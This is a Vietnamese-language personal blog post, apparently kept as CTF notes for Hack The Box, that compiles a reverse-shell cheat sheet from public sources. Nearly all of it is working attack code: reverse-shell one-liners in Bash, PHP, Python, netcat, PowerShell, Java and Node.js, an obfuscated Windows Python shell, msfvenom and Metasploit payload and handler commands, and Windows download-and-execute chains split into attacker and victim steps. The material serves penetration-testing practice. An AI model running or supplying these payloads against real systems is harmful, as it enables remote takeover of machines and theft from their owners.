+++
Categories = ["Hack The Box"]
Description = ""
Tags = ["Reverse Shell"]
date = "2019-06-17T12:02:32+07:00"
menu = "posts"
title = "Reverse Shell - Part 1"

+++

Note cho khi cần dùng đến.
# Reverse Shell

#### Bash
> bash -i >& /dev/tcp/1.3.3.7/1234 0>&1

> exec /bin/bash 0&0 2>&0
>msfvenom -p cmd/unix/reverse_bash LHOST=1.3.3.7 LPORT=1234 -f raw > shell.sh

#### PHP
>php -r '$sock=fsockopen("1.3.3.7",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

> msfpayload php/meterpreter/reverse_tcp LHOST=1.3.3.7 LPORT=1234 R > exploit.php

>msfvenom -p php/meterpreter_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

#### Python
>export RHOST="1.3.3.7";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

>C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('1.3.3.7',1234)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.3.3.7",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#### NC

> nc -e /bin/sh 1.3.3.7 1234

>OpenBSD:
>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f

>/bin/sh | nc 1.3.3.7 1234

>rm -f /tmp/p; mknod /tmp/p p && nc 1.3.3.7 1234 0/tmp/p

#### Telnet
>rm -f /tmp/p; mknod /tmp/p p && telnet ATTACKING-IP 80 0/tmp/p

>telnet 1.3.3.7 80| /bin/bash | telnet 1.3.3.7 1234

#### Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("1.3.3.7",1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('1.3.3.7',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```powershell
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```

```powershell
$sm=(New-Object Net.Sockets.TCPClient('1.3.3.7',1234)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```
#### Java
>r = Runtime.getRuntime()
>p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/.3.3.7/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
>p.waitFor()

>msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f raw > shell.jsp

>msfvenom -p java/jsp_shell_reverse_tcp LHOST=1.3.3.7 LPORT=1234 -f war > shell.war

#### NodeJS

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(1234, "1.3.3.7", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```
```javascript
require('child_process').exec('nc -e /bin/sh 1.3.3.7 1234')
```

```javascript
require("child_process").exec('bash -c "bash -i >%26 /dev/tcp/1.3.3.7/1234 0>%261"')
```
>https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

#### Kali Web Shells
>/usr/share/webshells/php/php-reverse-shell.php

>/usr/share/webshells/php/simple-backdoor.php

>/usr/share/webshells/php/php-backdoor.php

>/usr/share/webshells/perl/perl-reverse-shell.pl

>/usr/share/webshells/perl/perlcmd.cgi

>/usr/share/webshells/cfm/cfexec.cfm

>/usr/share/webshells/asp/

>/usr/share/webshells/aspx/

>/usr/share/webshells/jsp/jsp-reverse.jsp

### Metasploit Payloads
#### Binaries
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
#### Web Payloads
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
#### Scripting Payloads
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
#### Shellcode
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
#### Handlers
```bash
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```
### Get Reverse-shell via Windows one-liner
#### Mshta.exe
Attacker:
```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```
Victim:
```bash
mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
```
#### Rundll32.exe
Attacker
```bash
use  exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery)  >  set srvhost  192.168.1.109
msf exploit(windows/smb/smb_delivery)  >  exploit
```
Victim:
```bash
rundll32.exe  \\192.168.1.109\vabFG\test.dll,0
```
#### Regsvr32.exe
Attacker:
```bash
use  exploit/multi/script/web_delivery
msf exploit (web_delivery)>set target  3
msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp
msf exploit (web_delivery)> set lhost  192.168.1.109
msf exploit (web_delivery)>set srvhost  192.168.1.109
msf exploit (web_delivery)>exploit
```
Victim:
```bash
regsvr32  /s  /n  /u  /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
```
#### Certutil.exe
Attacker:
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
```
```bash
use  exploit/multi/handler
msf exploit(multi/handler)  >  set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler)  >  set lhost  192.168.1.109
msf exploit(multi/handler)  >  set lport  1234
msf exploit(multi/handler)  >  exploit
```
Victim:
```bash
certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
```
#### Powershell.exe
Attacker:
```bash
git clone  https://github.com/besimorhino/powercat.git
python  -m  SimpleHTTPServer  80
```
```bash
nc lvp 1234
```
Victim:
```bash
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
```
OR
Attacker:
```bash
msfvenom  -p  cmd/windows/reverse_powershell lhost=192.168.1.109  lport=1234 > 	1.bat
```
```bash
nc lvp 1234
```
Victim:
```bash
powershell  -c  "IEX((New-Object  System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
```
#### Cscript.exe
Attacker:
```bash
msfvenom  -p  cmd/windows/reverse_powershell lhost=192.168.1.109  lport=1234  -f  vbs  >  1.vbs
```
```bash
use  exploit/multi/handler
msf exploit(multi/handler)  >  set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler)  >  set lhost  192.168.1.109
msf exploit(multi/handler)  >  set lport  1234
msf exploit(multi/handler)  >  exploit
```
Victim:
```bash
powershell.exe  -c  "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```
#### Msiexec.exe
Attacker:
```bash
msfvenom  -p  windows/meterpreter/reverse_tcp lhost=192.168.1.109  lport=1234  -f  msi  >  1.msi
```
```bash
use  exploit/multi/handler
msf exploit(multi/handler)  >  set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler)  >  set lhost  192.168.1.109
msf exploit(multi/handler)  >  set lport  1234
msf exploit(multi/handler)  >  exploit
```
Victim:
```bash
msiexec  /q  /i  http://192.168.1.109/1.msi
```

#### Wmic.exe
Attacker:
[https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
```bash
git clone  //github.com/zerosum0x0/koadic
cd koadic
apt-get install python3-pip
pip3 install  -r  requirements.txt
./koadic
```
```bash
use  stager/js/wmic
set SRVHOST  192.168.1.107
run
```
Victim:
```bash
wmic os get  /FORMAT:"http://192.168.1.107:9996/g8gkv.xsl"
```

### Spawn TTY Shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
```
```bash
/bin/sh -i
```
```bash
perl -e 'exec "/bin/sh";'
```
```bash
perl: exec "/bin/sh";
```
```bash
ruby: exec "/bin/sh"
```
```bash
lua: os.execute('/bin/sh')
```
## Nguồn

Tổng hợp từ khắp mọi nơi trên thế giới

- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/](https://nitesculucian.github.io/2018/07/15/reverse-shells-cheat-sheet/)
- [http://www.codemania.it/2018/05/04/reverse-shell-cheat-sheet/](http://www.codemania.it/2018/05/04/reverse-shell-cheat-sheet/)
- [https://netsec.ws/?p=331](https://netsec.ws/?p=331)
- [https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
- [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- [https://hackernoon.com/reverse-shell-cf154dfee6bd](https://hackernoon.com/reverse-shell-cf154dfee6bd)
- [https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
- ...
